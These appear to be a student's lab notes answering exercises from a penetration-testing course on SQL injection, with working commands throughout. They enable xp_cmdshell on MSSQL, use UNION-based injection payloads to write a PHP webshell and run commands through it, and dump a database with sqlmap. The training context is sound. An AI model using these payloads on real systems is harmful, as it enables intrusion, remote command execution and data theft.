
1. Connect to the MSSQL VM 1 and enable _xp_cmdshell_ as showcased in this Module. Which MSSQL configuration option needs to be enabled before _xp_cmdshell_ can be turned on?

```bash
# IP: 192.168.122.18

# Connect via MSSQL
impacket-mssqlclient Administrator:Lab123@192.168.122.18 -windows-auth

# Command to be run first: 
EXECUTE sp_configure 'show advanced options', 1;
	# Option: show advanced options
```


2. Connect to the MySQL VM 2 and repeat the steps illustrated in this section to manually exploit the UNION-based SQLi. Once you have obtained a webshell, gather the flag that is located in the same **tmp** folder.


```bash
# IP: 192.168.122.19

%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

# Uploading a webshell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //                     '

# Accessing the webshell
192.168.122.19/tmp/webshell.php?cmd=id

# Launching a reverse shell
192.168.122.19/tmp/webshell.php?cmd=ls
192.168.122.19/tmp/webshell.php?cmd=cat flag.txt
```
![[Pasted image 20250314204544.png]]



3. Connect to the MySQL VM 3 and automate the SQL injection discovery via sqlmap as shown in this section. Then dump the _users_ table by abusing the time-based blind SQLi and find the flag that is stored in one of the table's records.

```bash
# IP: 192.168.122.19

# SQLmap
sqlmap -u http://192.168.122.19/blindsqli.php?user=1 -p user

# Dumping ALL the data structure
sqlmap -u http://192.168.122.19/blindsqli.php?user=1 -p user --dump
```

![[Pasted image 20250314214415.png]]